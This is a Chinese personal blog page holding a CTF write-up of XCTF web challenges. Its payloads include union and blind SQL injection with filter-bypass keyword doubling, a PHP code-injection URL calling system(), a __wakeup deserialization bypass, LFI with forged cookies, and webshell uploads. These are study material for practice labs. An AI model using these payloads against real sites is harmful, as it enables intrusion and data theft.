<!DOCTYPE HTML>
<html>

<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- Title -->
    
    <title>about - DV.K</title>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
    <meta name="keywords" content="DV.K CTFer" />
    <link rel="stylesheet" href="/css/main.css" />
    <link rel="stylesheet" href="/css/extend.css" />
    <link rel="stylesheet" href="/css/valine.css" />
    <link rel="bookmark"  type="image/x-icon"  href="https://cdn.dvkunion.cn/logo.png"/>
    <link rel="shortcut icon" href="https://cdn.dvkunion.cn/logo.png">
    <noscript><link rel="stylesheet" href="/css/noscript.css" /></noscript>
    <style>
        #banner {
            background-image: url("https://cdn.dvkunion.cn/bg.jpg");
        }
    </style>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>


    <body class="is-preload">
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="page-wrapper">
                <!-- Nav -->
        <header id="header">
            <h1 id="logo"><a href="/">DV.K</a></h1>
            <nav id="nav">
                <ul>
                    <li><a href="/">主页</a></li>
                    <li><a href="/archives/">文章</a>
                        <ul>
                            <li><a href="/archives/">归档</a><ul>
                                    <a class="archive-link" href="/archives/2022/01/">2022 - 01</a></li><li><a class="archive-link" href="/archives/2020/06/">2020 - 06</a></li><li><a class="archive-link" href="/archives/2019/12/">2019 - 12</a></li><li><a class="archive-link" href="/archives/2019/10/">2019 - 10</a></li><li><a class="archive-link" href="/archives/2019/08/">2019 - 08</a></li><li><a class="archive-link" href="/archives/2019/07/">2019 - 07</a></li><li><a class="archive-link" href="/archives/2019/06/">2019 - 06</a></li><li><a class="archive-link" href="/archives/2019/05/">2019 - 05</a></li><li><a class="archive-link" href="/archives/2019/03/">2019 - 03</a></li><li><a class="archive-link" href="/archives/2019/02/">2019 - 02</a></li><li><a class="archive-link" href="/archives/2019/01/">2019 - 01</a></li><li><a class="archive-link" href="/archives/2018/12/">2018 - 12</a></li><li><a class="archive-link" href="/archives/2018/11/">2018 - 11</a></li><li><a class="archive-link" href="/archives/2018/10/">2018 - 10</a>
                                </ul></li>
                            <li><a href="/tags/">标签</a></li>
                            <li><a href="/categories/">分类</a></li>
                        </ul>
                    </li>
                    <li><a href="/comments/">留言板</a></li>
                    <li><a href="/gallery/">图库</a></li>
                </ul>
            </nav>
        </header>

        <!-- Banner -->
        

        

        <!-- Main -->
        <div id="main" class="wrapper style1">
            <div class="container">
                <header class="major">
                    <h2>XCTF</h2>
                    <p>2019-02-16</p>
                     <p>文章共计 - 2.9k 字 阅读需要 - 11 分钟</p>
                </header>

                <!-- Content -->
                <section id="content">
                    <div class ="post_page_title_img" style="background-image: url(https://s2.ax1x.com/2019/02/18/kcDTWq.jpg);" ></div>
                    <hr>
                    <h1>XCTF</h1>
<h3><b>0x00- - 前言</b></h3>
<p>找到这个地方也是几经周折...发现自己错过了Hgame...然后不甘心的一顿搜索，结果撞到这个地方。<br>
不说了，刷起。</p>
<h3><b>0x01- - Web</b></h3>
<h4><font color="blue">level.1--新手练习</font><br></h4>
<p><b>01-view_source</b></p>
<p>题目提示使用view_source来查看源码。直接查看即可得到flag。<br>
F12效果相同</p>
<p><b>02-get_post</b></p>
<p>第一步提示get发送一个a=1<br>
第二步提示post发送一个b=2<br>
hackbar发送得到flag。</p>
<p><b>03-robots</b></p>
<p>Robots协议，联想到robots.txt<br>
查看robots.txt得到hint:flag_1s_h3re.php，访问得到flag。</p>
<p><b>04-backup</b></p>
<p>打开页面得到提示：你知道index.php的备份文件名吗？<br>
备份文件名为index.php.bak,下载保存，查看源码得到flag。</p>
<p><b>05-cookie</b></p>
<p>题目提示很到位，直接查看请求包cookie得到hint:cookie.php。<br>
访问得到下一个hint：http_response。<br>
查看响应包得到flag。</p>
<p><b>06-disabled_button</b></p>
<p>前端问题，F12修改前端代码之后点击即可。<br>
也可以直接构造请求包。</p>
<p><b>07-simple_js</b></p>
<p>js问题，访问之后是一个js窗要求输入密码<br>
查看源码，观察js代码。<br>
可以写出解密python脚本：<br>
对实际password直接输出得到ascii码值，输出其ascii码即是Flag。</p>
<p><b>08-xff_referer</b></p>
<p>提示伪造xff和referer。<br>
伪造即可得到flag。<br>
浏览器修改的话回音藏到后面，F12查看源码。</p>
<p><b>09-weak_auth</b></p>
<p>尝试登陆，提示密码错误，你可能需要一个字典。<br>
弱密码爆破得到flag。<br>
这里看教程拿到了一个字典库：<br>
<a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a></p>
<p><b>010-webshell</b></p>
<p>一句话木马，菜刀连一下。<br>
直接看到flag.txt。得到flag</p>
<p><b>011-command_execution</b></p>
<p>命令注入，相当于DVWA的Low level。<br>
cat /home flag.txt</p>
<p><b>012-simple_php</b></p>
<p>阅读php代码按要求输入即可...<br>
a:科学计数法绕过。<br>
b:%00截断。</p>
<h4><font color="blue">level.2--萌新入坑</font><br></h4>
<p><b>01-upload</b></p>
<p>打开是一个文件上传窗，随便上传一个发现回显路径;访问路径成功。<br>
尝试上传一句话木马：提示只能上传jpg，但是文件栏成功显示一句话木马文件，只是上传按钮变灰。<br>
联想到了是前端的过滤，禁用JS进行尝试。<br>
成功上传一句话木马，菜刀连接。得到flag。</p>
<p><b>02-NewsCenter</b></p>
<p>发现存在post注入点。<br>
手动注入：<br>
<code>1' order by 3#</code> 存在3列</p>
<p><code>1' union select 1,2,3</code> 查看回显位置</p>
<p><code>1' union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#</code>或者<code>1' union select 1,2,schema_name from information_schema.schemata#</code>查看存在哪些数据库。</p>
<p><code>1' union select 1,2,user()#</code>查看用户。</p>
<p><code>1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='news'#</code>查看new内有哪些表单。</p>
<p><code>1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='secret_table'#</code>查看sercet_table下的列名。</p>
<p><code>1' union select 1,2,fl4g from secret_table#</code>查询数据得到flag。</p>
<blockquote>
<p>自己手动注入那叫一个差劲啊</p>
</blockquote>
<p><b>03-Training-Get-Resourced</b></p>
<p>题目描述不让看注释，就去看看注释<br>
啊，有了...(这难度星级是随便打的嘛...)</p>
<p><b>04-Triangle</b></p>
<p>没有任何提示，先打开看看。<br>
一个要求输入Flag的页面。<br>
看到了后面的js脚本。。。<br>
ok，不会，看题解了。<br>
这是一道JS逆向题...<br>
console可以看到关键的三个函数。。。<br>
题目解释说是unicorn.js的一个ARM仿真加密，需要IDE逆向...</p>
<p><b>05-mfw</b></p>
<p>首先发现了注释：my secret，而url仿佛存在任意文件访问漏洞。然而尝试后发现会有detect保护。<br>
继续查看剩下的页面，发现组成部分中包含：GIT<br>
难道是git泄露？<br>
ok,发现.git文件目录。学习了gitTools使用方法，下载到了源码。<br>
看到index.php内存在一个这样的语句</p>
<p><code>$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</code></p>
<p>这里存在着任意命令执行漏洞。</p>
<p>构造<code>111.198.29.45:31701/index.php?page=%27.system(&quot;cd%20../../../;%20ls%20-lA;&quot;).%27about</code></p>
<p>这里大神还给出了一个小技巧，使用view-source可以格式化查看结果。<br>
查看flag.php，得到flag<br>
这里我完全是瞎猫碰死耗子。。。大佬解释了为什么.git内不存在flag内容而通过上述操作的就存在答案。因为对git的命令和原理根本不熟悉。</p>
<p>大佬重审了git下载的库,发现主机内的flag.php文件被修改，但是还没有提交，使用<code>git diff</code>命令进行对比，得到了flag...</p>
<blockquote>
<p>follow the master,（跟随大师，）</p>
<p>and walk with the master,（与大师通行，）</p>
<p>新增支线任务：学习git</p>
</blockquote>
<p><b>06-ics-06</b></p>
<p>以为又是注入...结果发现根本不是一个注入点。<br>
后来想了想题面提示，只有一个。<br>
...不会让我爆破id把。。。<br>
然后测了一下id=9999999都不报错....<br>
行吧，爆破下把。<br>
OK,2333<br>
的确是送分题，感觉很恶心。。。（如果我爆破只跑了2222怎么办？）</p>
<p><b>07-upload</b></p>
<p>看题目意思应该是一个上传题目。<br>
测试一下，发现只能够上传jpg图片文件。<br>
行吧，卡住了，找大佬去了。<br>
然后说这是一个注入题。。。文件名的二次注入(这谁扛得住啊...)<br>
先去默默地了解下二次注入...(sqliab)<br>
二次注入的思路是先将脏数据存入到数据库中，再取出的过程中完成对Sql语句的污染。<br>
。。。二次注入的大佬思路没看懂...这里使用了另一个大佬的盲注,通过insert注入回显。：</p>
<p><code>1' &amp; (( seleselectct count(table_name) frfromom information_schema.tables where table_schema=database())=1)&amp; '1.jpg&quot;</code></p>
<p>获取表的数量</p>
<p><code>filename=&quot;1' &amp; (sselectelect (seselectlect length(table_name) frofromm information_schema.tables where table_schema=database() limit 0,1)&gt;8)&amp; '1.jpg&quot;</code></p>
<p>获取表的长度</p>
<p><code>filename=&quot;1' &amp; (ascii(substr((selselectect table_name frfromom information_schema.tables where table_schema=database() limit 0,1) ,1,1)) &gt; 100 )&amp; '1.jpg&quot;</code></p>
<p>获取表的名称</p>
<p>的确是一个可行的方案，但是这个原题目应该有验证码的，所以盲注需要时间太长了。<br>
再看大佬的大佬的注入方法：</p>
<p><code>‘+concat((selselectect version()))+’.jpg</code></p>
<p>查看mysql 版本，返回 5.6</p>
<p><code>‘+concat((selselectect length(database())))+’.jpg</code></p>
<p>查看database长度 返回 10</p>
<p><code>‘+concat((selselectect ascii(substr(database(),1,1))))+’.jpg</code></p>
<p>查看Database名字 返回 119 以此繼續爆..</p>
<p><code>‘+concat((selselectect ascii(substr((selselectect table_name frfromom information_schema.tables where table_schema=database() limit 0,1),1,1))))+’.jpg</code></p>
<p>爆第一个表名 返回 102 以此繼續爆..到第5位</p>
<p><code>‘+concat((selselectect ascii(substr((selselectect table_name frfromom information_schema.tables where table_schema=database() limit 1,1),1,1))))+’.jpg</code></p>
<p>爆第二个表名 返回 104 以此繼續爆..到第18位</p>
<p><code>‘+concat((selselectect ascii(substr((selselectect column_name frfromom information_schema.columns where table_name=’hello_flag_is_here’ limit 0,1),1,1))))+’.jpg</code></p>
<p>爆列名字 返回 105</p>
<p>以此繼續爆..到第10位</p>
<p><code>‘+concat((selselectect ascii(substr((selselectect i_am_flag frfromom hello_flag_is_here LIMIT 0,1),1,1))))+’.jpg</code></p>
<p>爆数据 返回 33 以此繼續爆..到第16位</p>
<p>跟着这个大佬的思路，总算是做出来了。。。要改一个地方，这个题目过滤了ascii，所以我用了hex来转成16进制输出.</p>
<p>再遇坑点：hex输出时候会吞掉字符只输出数字。</p>
<p>这里感觉对concat的理解还不到位。</p>
<p>再次换方法：放弃concat 使用 conv 对hex 转换成二进制。</p>
<p>一位一位的读出来。得到flag</p>
<blockquote>
<p>好好练习sql注入</p>
</blockquote>
<p><b>08-biscuiti-300</b></p>
<p>打开发现一个简单的username 和password的登录窗</p>
<p>一个post方法的登录。</p>
<p>尝试注入,但是不管结果是啥返回只有一个error...</p>
<p>扔去暴力破解吧...</p>
<p>ok直接炸出来0的时候admin登陆成功...然并卵啊。</p>
<p>行吧，那就继续研究注入吧。</p>
<p>又是没见过的注入：</p>
<p><code>'union select '123','456'--&amp;password=0</code><br>
可以用任意用注入。</p>
<p>查看cookie 发现一个base64加密的序列化。</p>
<p>需要将is admin置为1。</p>
<p>这里提到了CBC字节反转攻击...padding oracle</p>
<p><b>09-unserialize3</b><br>
题目是一段php，给了一个class，要求用code传输反序列化的字符串。<br>
构造了一个反序列化提交：O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}，返回bad request。<br>
这里由于class内有__wakeup()函数导致在反序列化时会运行这个函数。<br>
于是题目转变成了魔术函数的绕过：这是一个CVE，漏洞编号CVE-2016-7124<br>
当成员属性数目大于实际数目时可绕过__wakeup()。<br>
修改poc,得到flag。<br>
<code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></p>
<p><b>10-wtf.sh-150</b></p>
<p>连接是一个带有注册和登录的论坛界面。<br>
一开始以为是注入...对着测试了一通。。<br>
还是跟着大佬的脚步把、、、<br>
不得不说大佬是真的强：对于注册窗口用户名存xss漏洞都能挖出来...<br>
首先这题存在着源码泄露：wtf.sh可以直接查看源码<br>
查看源码时可以发现存在LFI漏洞，我们需要以管理员身份登陆，并且登录的token 和password在/users目录下<br>
尝试使用LFI漏洞进行访问：../users<br>
得到了众多用户的md5 密文和base64的token<br>
修改cookie和token F5刷新可以看到，我们已经是管理员登录了，在管理page页面内得到了...半句flag(wtf??)<br>
行吧，这种题目水平已经不是我能够做的了，老实的跟着大佬做吧...<br>
继续查看源码...会发现在reply中包含一个可以写入文件的参数、<br>
首先注册用户名为 ${find,/,-iname,get_flag2} 的用户，并以该用户进行提交<br>
<code>POST /reply.wtf?post=../users_lookup/sh.wtf%09 HTTP/1.1 Host: web.chal.csaw.io:8001 Content-Type: application/x-www-form-urlencoded Cookie: USERNAME=${find,/,-iname,get_flag2}; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ== text=asd&amp;submit=</code><br>
之后访问我们提交的页面/users_lookup/sh.wtf<br>
可以得到flag2的访问路径。<br>
由此，我们重新构造请求访问Flag2即可。</p>
<p><b>11-Training-WWW-Robots</b></p>
<p>题目提示 robots.txt，是一个 robots 泄露。访问提示：/fl0g.php，访问得到flag<br>
。。。题目难度差距有点大。</p>
<p><b>12-PHP2</b></p>
<p>有个坑点。。。原题好像有提示说index.phps有源码...<br>
打开查看源码,发现是一个二次url加密绕过...对admin二次加密即可...</p>
<p><b>13-lottery</b></p>
<p>这个源码给的就很舒服了，直接就在附件中，先看源码吧。</p>
<p><b>14-FlatScience</b></p>
<p>robots.txt给了两个页面的提示，访问login.php存在注释：debug参数<br>
GET debug参数可以查看源码，发现存在注入点。<br>
注入得到cookie提示，密码在他的论文里。<br>
写个脚本跑sha1值得到密码。<br>
登录即可。</p>
<p>注入payload:usr=' union select 1,(select id || '; ' || name || '; ' || password || '; ' || hint from Users limit 1)--&amp;pw=</p>
<p><b>15-ics-01</b></p>
<p>题目提示是一个工控系统，寻找入手点。<br>
自己做的时候绕了一大阵子那个上传点，一中午之后愤怒查找题解。。。</p>
<p>结果还是少了几句话的提示原因。。。</p>
<p>首先源码泄露....不知道为什么御剑字典里没有这种类型的测试。</p>
<p><code>.index.php.swp</code><br>
<code>.index.php.swo</code><br>
<code>.index.php.swn</code></p>
<p>下载到源码swp文件，但是就是怎么都恢复不出来???<br>
行吧，默认当作有源码做了。。。<br>
然后发现可以使用php://input来查看upload.php的源码...</p>
<p><b>16-NaNNaNNaNNaN-Batman</b></p>
<p>好的我又开始上提还没做完就来做下一道题了。<br>
这题只有一个附件，给了一个web100的源码。<br>
里面大概是js代码的样子。<br>
熟悉的特殊符号。。。这题好像哪里见到过的样子。但是想不起来怎么处理的了。<br>
估计又是做了一半扔掉了。</p>
<p>OK，老规矩之后，这题学习一下chrome调试大法。<br>
F12 -&gt; source 进入到开发者模式。在eval前加入断点调试。即可得到源码。。<br>
正则表达式构造出密码直接得到flag.</p>
<p>还有好多种骚方法。。。直接代码审计，，，看出flag。<br>
还有大佬把eval()换成alert()....直接弹出来。<br>
dalao tql...</p>
<p><b>17</b></p>

                </section>

            </div>
        </div>
    </div>
        <!-- Main -->

    <div id="main" class="wrapper style1">
        <div class="container">
            <section id="content" class="wrapper style1 special fade-up">

                <header class="major">
                    <h2>留言板</h2>
                    <p>说点什么吧</p>
                </header>
                <div class="row gtr-150">
                    <div class="col-12 col-12-medium">
                        <!-- Content -->
                        <div id="vcomment"></div>
                    </div>
                </div>
            </section>
        </div>
    </div>

    <footer id="footer">
        <!--  copyright  -->
        <ul class="copyright">
            <li>&copy;2018-2022 DVK</li><li>Powered by Hexo</li><li>Design: DVK</li>
        </ul>
        
        <ul class="copyright">
                <li style="height: 17px;width: 17px; background-image: url(https://image.3001.net/images/20210606/16229429757102.png);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" ></li>
                <liICP>鲁ICP备2021028491号</liICP>
        </ul>
        
        <!--  script  -->
        
        <script src="/js/Valine.min.js"></script>
        <script>
                new Valine({
                        el:'#vcomment',
                        appId: 'jEB3oMGUgUvE5Qc3pSwDO1Pg-gzGzoHsz',
                        appKey: 'WgBXad9R6JRSoxTMohDelbFs',
                        visitor: true, // 阅读量统计
                        master: ["f21bae5bf498b089b545f6f0a986e224"],
                        friends: [""]
                })

        </script>
        
        <script src="/js/jquery.min.js"></script>
        <script src="/js/jquery.scrolly.min.js"></script>
        <script src="/js/jquery.dropotron.min.js"></script>
        <script src="/js/jquery.scrollex.min.js"></script>
        <script src="/js/browser.min.js"></script>
        <script src="/js/breakpoints.min.js"></script>
        <script src="/js/util.js"></script>
        <script src="/js/main.js"></script>
        <script src="/js/lazyload.js"></script>
        
        <script type="text/javascript" src="/js/mouse.js"></script>
    </footer><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->

</body>


</html>
